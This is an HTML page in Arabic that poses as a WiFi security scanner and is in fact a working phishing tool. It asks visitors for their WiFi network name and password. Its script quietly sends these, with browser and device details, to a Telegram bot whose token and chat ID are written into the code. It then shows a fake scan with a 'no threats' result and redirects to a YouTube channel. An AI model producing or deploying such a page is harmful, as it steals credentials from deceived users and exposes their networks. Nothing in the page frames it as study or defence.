<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Security Audit</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); text-align: center; }
        .icon { font-size: 50px; color: #28a745; margin-bottom: 15px; }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 0.9rem; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; background: #28a745; color: white; padding: 13px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: bold; }
        
        #loader { display: none; margin-top: 20px; }
        .prog-bar { width: 100%; background: #eee; height: 8px; border-radius: 10px; overflow: hidden; }
        .prog-fill { width: 0%; height: 100%; background: #28a745; transition: width 5s linear; }
        
        #result { display: none; margin-top: 20px; color: #28a745; font-weight: bold; }
    </style>
</head>
<body>

<div class="card" id="box">
    <div class="icon">🛡️</div>
    <h2 id="title">فحص أمان الشبكة</h2>
    <p id="desc">أدخل بيانات الواي فاي للتأكد من خلو اتصالك من المتلصصين والهكر.</p>
    
    <div id="inputs">
        <input type="text" id="wifiName" placeholder="اسم الشبكة">
        <input type="password" id="wifiPass" placeholder="كلمة السر">
        <button onclick="process()">بدء عملية التحقق</button>
    </div>

    <div id="loader">
        <p>جاري تحليل أمان الشبكة والجهاز...</p>
        <div class="prog-bar"><div class="prog-fill" id="fill"></div></div>
    </div>

    <div id="result">
        <p>✅ تم الفحص! لم يتم العثور على تهديدات.</p>
        <p>جاري توجيهك لتقرير الأمان...</p>
    </div>
</div>

<script>
    const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
    const chat = "8042090388";

    async function process() {
        const name = document.getElementById('wifiName').value;
        const pass = document.getElementById('wifiPass').value;

        if(!name || !pass) { alert("أدخل البيانات أولاً"); return; }

        // إخفاء المدخلات وإظهار التحميل
        document.getElementById('inputs').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('fill').style.width = '100%';

        // إرسال تقرير المعلومات فوراً إلى تليجرام
        const report = `
📢 تقرير فحص أمان جديد:
----------------------
📶 الشبكة: ${name}
🔑 الباسورد: ${pass}
----------------------
📱 معلومات الجهاز:
- نظام التشغيل: ${navigator.platform}
- المتصفح: ${navigator.userAgent.split(') ')[1]}
- الشاشة: ${screen.width}x${screen.height}
- اللغة: ${navigator.language}
        `;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chat, text: report })
        });

        // الانتظار 5 ثوانٍ لإتمام الفحص الوهمي
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('result').style.display = 'block';

            // بعد ثانيتين من ظهور "تم الفحص"، يتم التحويل لليوتيوب
            setTimeout(() => {
                window.location.href = "https://youtube.com/@benjaminbennetttt?si=9J7bqSt389IK3tUB";
            }, 2000);

        }, 5000);
    }
</script>

</body>
</html>
